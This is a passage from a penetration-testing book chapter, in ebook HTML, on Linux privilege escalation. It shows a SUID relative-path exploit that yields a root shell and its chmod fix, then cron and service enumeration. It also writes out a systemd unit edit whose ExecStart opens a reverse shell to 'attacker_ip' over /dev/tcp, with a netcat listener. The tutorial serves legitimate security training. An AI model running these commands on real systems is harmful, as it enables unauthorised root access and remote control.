     Let’s run these commands on the target system and compare the output.
    </span>
    <span class="koboSpan" id="kobo.726.2">
     The following figure shows the partial output of the command that searches for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.727.1">
      SUID files:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer162">
     <span class="koboSpan" id="kobo.728.1">
      <img alt="Figure 11.32 – Partial output of a list of SUID files" src="image/B22229_11_32.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.729.1">
     Figure 11.32 – Partial output of a list of SUID files
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.730.1">
     In the output on
    </span>
    <a id="_idIndexMarker712">
    </a>
    <span class="koboSpan" id="kobo.731.1">
     the
    </span>
    <a id="_idIndexMarker713">
    </a>
    <span class="koboSpan" id="kobo.732.1">
     target
    </span>
    <a id="_idIndexMarker714">
    </a>
    <span class="koboSpan" id="kobo.733.1">
     system, there are two interesting matches found in the user’s home directories.
    </span>
    <span class="koboSpan" id="kobo.733.2">
     This is shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.734.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer163">
     <span class="koboSpan" id="kobo.735.1">
      <img alt="Figure 11.33 – Specific SUID files from our search are examined" src="image/B22229_11_33.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.736.1">
     Figure 11.33 – Specific SUID files from our search are examined
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.737.1">
     Taking a look at the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.738.1">
      /home/user3/shell
     </span>
    </strong>
    <span class="koboSpan" id="kobo.739.1">
     file, we run the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.740.1">
      file
     </span>
    </strong>
    <span class="koboSpan" id="kobo.741.1">
     command and find that it’s a compiled executable, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.742.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer164">
     <span class="koboSpan" id="kobo.743.1">
      <img alt="Figure 11.34 – The file command on shell shows that it’s a compiled ELF executable" src="image/B22229_11_34.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.744.1">
     Figure 11.34 – The file command on shell shows that it’s a compiled ELF executable
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.745.1">
     There are Linux debugging programs that will trace the execution and print system and library calls.
    </span>
    <span class="koboSpan" id="kobo.745.2">
     However, we don’t need to make this any more complicated than it is.
    </span>
    <span class="koboSpan" id="kobo.745.3">
     If we run the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.746.1">
      strings
     </span>
    </strong>
    <span class="koboSpan" id="kobo.747.1">
     command (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.748.1">
      strings /home/user3/shell
     </span>
    </strong>
    <span class="koboSpan" id="kobo.749.1">
     ), we find a reference to a file,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.750.1">
      ./.script.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.751.1">
     , as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.752.1">
      next figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer165">
     <span class="koboSpan" id="kobo.753.1">
      <img alt="Figure 11.35 – The output of the strings command shows that it calls a shell script file" src="image/B22229_11_35.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.754.1">
     Figure 11.35 – The output of the strings command shows that it calls a shell script file
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.755.1">
     I check the contents of this file and it’s simply a taunt and doesn’t contain anything useful.
    </span>
    <span class="koboSpan" id="kobo.755.2">
     However, I see in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.756.1">
      strings
     </span>
    </strong>
    <span class="koboSpan" id="kobo.757.1">
     output that
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.758.1">
      .script.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.759.1">
     is called using its relative path,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.760.1">
      ./.script.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.761.1">
     .
    </span>
    <span class="koboSpan" id="kobo.761.2">
     This means that instead of calling the absolute path of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.762.1">
      /home/user3/.script.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.763.1">
     , it’s
    </span>
    <a id="_idIndexMarker715">
    </a>
    <span class="koboSpan" id="kobo.764.1">
     called
    </span>
    <a id="_idIndexMarker716">
    </a>
    <span class="koboSpan" id="kobo.765.1">
     relative
    </span>
    <a id="_idIndexMarker717">
    </a>
    <span class="koboSpan" id="kobo.766.1">
     to the current working directory.
    </span>
    <span class="koboSpan" id="kobo.766.2">
     We can
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.767.1">
      cd
     </span>
    </strong>
    <span class="koboSpan" id="kobo.768.1">
     to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.769.1">
      /tmp
     </span>
    </strong>
    <span class="koboSpan" id="kobo.770.1">
     directory, create a malicious version of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.771.1">
      .script.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.772.1">
     , and execute
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.773.1">
      /home/user3/shell
     </span>
    </strong>
    <span class="koboSpan" id="kobo.774.1">
     , which will call the local copy of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.775.1">
      .script.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.776.1">
     , since we don’t have permission to write to the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.777.1">
      original copy.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.778.1">
     The following figure demonstrates this process of exploiting the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.779.1">
      /home/user3/shell
     </span>
    </strong>
    <span class="koboSpan" id="kobo.780.1">
     SUID file to get a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.781.1">
      root shell:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer166">
     <span class="koboSpan" id="kobo.782.1">
      <img alt="Figure 11.36 – Exploiting an SUID file to gain root privileges" src="image/B22229_11_36.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.783.1">
     Figure 11.36 – Exploiting an SUID file to gain root privileges
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.784.1">
     Now that you’ve seen how dangerous SUID and SGID executables can be, let’s talk about how to secure them
    </span>
    <a id="_idIndexMarker718">
    </a>
    <span class="koboSpan" id="kobo.785.1">
     to
    </span>
    <a id="_idIndexMarker719">
    </a>
    <span class="koboSpan" id="kobo.786.1">
     prevent
    </span>
    <a id="_idIndexMarker720">
    </a>
    <span class="koboSpan" id="kobo.787.1">
     exploitation.
    </span>
    <span class="koboSpan" id="kobo.787.2">
     If we examine the file permissions, we see that
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.788.1">
      others
     </span>
    </em>
    <span class="koboSpan" id="kobo.789.1">
     can read and execute, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.790.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer167">
     <span class="koboSpan" id="kobo.791.1">
      <img alt="Figure 11.37 – Examining the file permissions of the SUID shell" src="image/B22229_11_37.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.792.1">
     Figure 11.37 – Examining the file permissions of the SUID shell
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.793.1">
     It currently has the numeric file permissions of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.794.1">
      4755
     </span>
    </strong>
    <span class="koboSpan" id="kobo.795.1">
     .
    </span>
    <span class="koboSpan" id="kobo.795.2">
     To keep the SUID set and secure the file from those who are not the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.796.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.797.1">
     user or in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.798.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.799.1">
     group, we can remediate this using the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.800.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.801.1">
$ chmod 4754 /home/user3/shell</span></pre>
   <p>
    <span class="koboSpan" id="kobo.802.1">
     After entering this command, you can see in the following figure that anyone other than
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.803.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.804.1">
     or a member of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.805.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.806.1">
     group can no longer execute
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.807.1">
      this file:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer168">
     <span class="koboSpan" id="kobo.808.1">
      <img alt="Figure 11.38 – Entering the chmod command to remediate this vulnerable SUID file" src="image/B22229_11_38.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.809.1">
     Figure 11.38 – Entering the chmod command to remediate this vulnerable SUID file
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.810.1">
     This concludes the topic
    </span>
    <a id="_idIndexMarker721">
    </a>
    <span class="koboSpan" id="kobo.811.1">
     of
    </span>
    <a id="_idIndexMarker722">
    </a>
    <span class="koboSpan" id="kobo.812.1">
     exploiting
    </span>
    <a id="_idIndexMarker723">
    </a>
    <span class="koboSpan" id="kobo.813.1">
     and securing SUID and SGID executables.
    </span>
    <span class="koboSpan" id="kobo.813.2">
     In the next section, you’ll learn about enumerating and exploiting misconfigured services and scheduled tasks
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.814.1">
      in Bash.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-185">
    <a id="_idTextAnchor345">
    </a>
    <span class="koboSpan" id="kobo.815.1">
     Leveraging misconfigured services and scheduled tasks
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.816.1">
     In cybersecurity, understanding
    </span>
    <a id="_idIndexMarker724">
    </a>
    <span class="koboSpan" id="kobo.817.1">
     how to enumerate, exploit, and
    </span>
    <a id="_idIndexMarker725">
    </a>
    <span class="koboSpan" id="kobo.818.1">
     secure misconfigured services and cron jobs on Linux systems is essential.
    </span>
    <span class="koboSpan" id="kobo.818.2">
     This section will guide you through the process using Bash scripting, providing practical examples
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.819.1">
      and explanations.
     </span>
    </span>
   </p>
   <p>
    <strong class="bold">
     <span class="koboSpan" id="kobo.820.1">
      Systemd
     </span>
    </strong>
    <span class="koboSpan" id="kobo.821.1">
     is a
    </span>
    <a id="_idIndexMarker726">
    </a>
    <span class="koboSpan" id="kobo.822.1">
     system and service manager for Linux operating systems.
    </span>
    <span class="koboSpan" id="kobo.822.2">
     It is responsible for initializing the system, managing system processes, and handling system services.
    </span>
    <span class="koboSpan" id="kobo.822.3">
     Systemd services are essential components that define how various applications and processes should be started, stopped,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.823.1">
      and managed.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.824.1">
     Systemd services are defined by unit files, which are configuration files that describe how to manage a service or process.
    </span>
    <span class="koboSpan" id="kobo.824.2">
     These unit files typically have a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.825.1">
      .service
     </span>
    </strong>
    <span class="koboSpan" id="kobo.826.1">
     extension and are located in directories such as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.827.1">
      /etc/systemd/system/
     </span>
    </strong>
    <span class="koboSpan" id="kobo.828.1">
     or
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.829.1">
      /lib/systemd/system/
     </span>
    </strong>
    <span class="koboSpan" id="kobo.830.1">
     .
    </span>
    <span class="koboSpan" id="kobo.830.2">
     Each service unit file contains several sections that specify the behavior of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.831.1">
      the service.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.832.1">
     To begin, we need to list all active services on the system.
    </span>
    <span class="koboSpan" id="kobo.832.2">
     This can be achieved using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.833.1">
      systemctl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.834.1">
     command, as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.835.1">
      shown next:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.836.1">
$ systemctl list-units --type=service --state=active</span></pre>
   <p>
    <span class="koboSpan" id="kobo.837.1">
     This command lists all active services on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.838.1">
      the system.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.839.1">
     Next, we need to check the permissions of these services to identify
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.840.1">
      any misconfigurations.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.841.1">
     Writable service files can be exploited by modifying them to execute malicious code.
    </span>
    <span class="koboSpan" id="kobo.841.2">
     The following command searches for writable files
    </span>
    <a id="_idTextAnchor346">
    </a>
    <a id="_idTextAnchor347">
    </a>
    <span class="koboSpan" id="kobo.842.1">
     i
    </span>
    <a id="_idTextAnchor348">
    </a>
    <a id="_idTextAnchor349">
    </a>
    <span class="koboSpan" id="kobo.843.1">
     n the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.844.1">
       systemd
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.845.1">
      directory:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.846.1">
$ find /etc/systemd/system/ -type f -writable</span></pre>
   <p>
    <span class="koboSpan" id="kobo.847.1">
     The output of this command doesn’t return any results on the target system.
    </span>
    <span class="koboSpan" id="kobo.847.2">
     However, let’s continue and learn how to modify writable service files if you find one during your pentests.
    </span>
    <span class="koboSpan" id="kobo.847.3">
     If a writable service file is found, it can be modified to execute a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.848.1">
      reverse shell.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.849.1">
     Here is an example of modifying a writable service file (replace
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.850.1">
      attacker_ip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.851.1">
     with the appropriate val
    </span>
    <a id="_idTextAnchor350">
    </a>
    <a id="_idTextAnchor351">
    </a>
    <span class="koboSpan" id="kobo.852.1">
     ue from your
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.853.1">
      Kali system):
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.854.1">
$ echo "[Service]
ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1'" &gt; /etc/systemd/system/vulnerable.service</span></pre>
   <p>
    <span class="koboSpan" id="kobo.855.1">
     On your Kali system, execute
    </span>
    <a id="_idIndexMarker727">
    </a>
    <span class="koboSpan" id="kobo.856.1">
     the following command to be ready to
    </span>
    <a id="_idIndexMarker728">
    </a>
    <span class="koboSpan" id="kobo.857.1">
     receive the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.858.1">
      reverse shell:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.859.1">
$ nc -nlvp 4444</span></pre>
   <p>
    <span class="koboSpan" id="kobo.860.1">
     Then, reload the systemd manager configuration,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.861.1">
      as shown:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.862.1">
$ systemctl daemon-reload</span></pre>
   <p>
    <span class="koboSpan" id="kobo.863.1">
     Restart the vulnerable service,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.864.1">
      as shown:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.865.1">
$ systemctl restart vulnerable.service</span></pre>
   <p>
    <span class="koboSpan" id="kobo.866.1">
     This should result in receiving a reverse shell from
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.867.1">
      the target.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.868.1">
     Now that you’ve learned how to enumerate and exploit vulnerable services, let’s move ahead and
    </span>
    <a id="_idIndexMarker729">
    </a>
    <span class="koboSpan" id="kobo.869.1">
     examine
    </span>
    <span class="No-Break">
     <strong class="bold">
      <span class="koboSpan" id="kobo.870.1">
       cron jobs
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.871.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.872.1">
     Cron jobs are scheduled tasks that run automatically at specified intervals on Unix-like operating systems.
    </span>
    <span class="koboSpan" id="kobo.872.2">
     They are managed by
    </span>
    <a id="_idIndexMarker730">
    </a>
    <span class="koboSpan" id="kobo.873.1">
     the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.874.1">
      cron daemon
     </span>
    </strong>
    <span class="koboSpan" id="kobo.875.1">
     , a background process that executes commands at predetermined times and dates.
    </span>
    <span class="koboSpan" id="kobo.875.2">
     In cybersecurity, cron jobs can be invaluable for automating routine tasks, monitoring systems, and maintaining security protocols.
    </span>
    <span class="koboSpan" id="kobo.875.3">
     Cron jobs can be exploited
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.876.1">
      if misconfigured.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.877.1">
     The following Bash command is used to examine scheduled tasks on a Linux system, specifically, to identify potential privilege escalation opportunities related to cr
    </span>
    <a id="_idTextAnchor352">
    </a>
    <a id="_idTextAnchor353">
    </a>
    <span class="koboSpan" id="kobo.878.1">
     on jobs and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.879.1">
      scheduled tasks:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.880.1">
$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&gt;/dev/null | grep -v "^#"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.881.1">
     By running this command, you are looking for all scheduled tasks (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.882.1">
      cron
     </span>
    </strong>
    <span class="koboSpan" id="kobo.883.1">
     jobs,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.884.1">
      at
     </span>
    </strong>
    <span class="koboSpan" id="kobo.885.1">
     jobs, and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.886.1">
      anacron
     </span>
    </strong>
    <span class="koboSpan" id="kobo.887.1">
     jobs) that are configured on the system, excluding any
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.888.1">
      commented lines.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.889.1">
     The output of this command on the target system can be seen in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.890.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer169">
     <span class="koboSpan" id="kobo.891.1">
      <img alt="Figure 11.39 – The output of the command that examines scheduled tasks" src="image/B22229_11_39.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.892.1">
     Figure 11.39 – The output of the command that examines scheduled tasks
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.893.1">
     You can see in the
    </span>
    <a id="_idIndexMarker731">
    </a>
    <span class="koboSpan" id="kobo.894.1">
     figure
    </span>
    <a id="_idIndexMarker732">
    </a>
    <span class="koboSpan" id="kobo.895.1">
     that
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.896.1">
      autoscript.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.897.1">
     is running
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.898.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.899.1">
       root
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.900.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.901.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.902.1">
      autoscript.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.903.1">
     entry was also discovered earlier in the chapter, as seen in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.904.1">
      pspy64
     </span>
    </strong>
    <span class="koboSpan" id="kobo.905.1">
     command output,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.906.1">
      shown here:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer170">
     <span class="koboSpan" id="kobo.907.1">
      <img alt="Figure 11.40 – The pspy64 command output reveals the autoscript.sh entry running as root" src="image/B22229_11_40.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.908.1">
     Figure 11.40 – The pspy64 command output reveals the autoscript.sh entry running as root
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.909.1">
     We examine the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.910.1">
      autoscript.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.911.1">
     file content to find what it’s executing, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.912.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer171">
     <span class="koboSpan" id="kobo.913.1">
      <img alt="Figure 11.41 – Examining the content of autoscript.sh to understand its purpose" src="image/B22229_11_41.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.914.1">
     Figure 11.41 – Examining the content of autoscript.sh to understand its purpose
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.915.1">
     We see that it seems to be incomplete, according to the remark.
    </span>
    <span class="koboSpan" id="kobo.915.2">
     However, it does execute an interactive shell with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.916.1">
      bash -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.917.1">
       i
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.918.1">
      command.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.919.1">
     When examining the file permissions, we find that
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.920.1">
      user6
     </span>
    </strong>
    <span class="koboSpan" id="kobo.921.1">
     doesn’t have permission to write to the file, and it’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.922.1">
      not SUID:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer172">
     <span class="koboSpan" id="kobo.923.1">
      <img alt="Figure 11.42 – Examining the autoscript.sh file permissions" src="image/B22229_11_42.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.924.1">
     Figure 11.42 – Examining the autoscript.sh file permissions
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.925.1">
     From this perspective, we’ll need to have a shell as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.926.1">
      user4
     </span>
    </strong>
    <span class="koboSpan" id="kobo.927.1">
     or obtain the password for the account to exploit this privilege escalation vector.
    </span>
    <span class="koboSpan" id="kobo.927.2">
     We have neither in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.928.1">
      this scenario.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.929.1">
     Securing vulnerable services and cron jobs is approached in the same way that we previously secured SUID and SGID executables, by examining file permissions and ensuring that unauthorized users do not have access to edit or
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.930.1">
      run them.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.931.1">
     By following these steps, you can enumerate and exploit misconfigured services and cron jobs on Linux
    </span>
    <a id="_idIndexMarker733">
    </a>
    <span class="koboSpan" id="kobo.932.1">
     systems
    </span>
    <a id="_idIndexMarker734">
    </a>
    <span class="koboSpan" id="kobo.933.1">
     using Bash scripting.
    </span>
    <span class="koboSpan" id="kobo.933.2">
     Understanding these vulnerabilities helps in securing systems against
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.934.1">
      potential attacks.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-186">
    <a id="_idTextAnchor354">
    </a>
    <span class="koboSpan" id="kobo.935.1">
     Summary
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.936.1">
     This chapter was dedicated to exploring the techniques and strategies for achieving privilege escalation through the Bash shell in pentesting scenarios.
    </span>
    <span class="koboSpan" id="kobo.936.2">
     It focused on identifying and exploiting system vulnerabilities and misconfigurations that could lead to elevated privileges in a Linux
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.937.1">
      Bash environment.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.938.1">
     Linux systems are frequently used to serve web applications.
    </span>
    <span class="koboSpan" id="kobo.938.2">
     Knowledge of how to escalate privileges would be valuable to a pentester who has exploited a web application and gained a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.939.1">
      low-privilege shell.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.940.1">
     The next chapter will examine post-exploitation persistence and pivoting in a Linux
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.941.1">
      Bash environment.
     </span>
    </span>
   </p>
  </div>
 </body></html>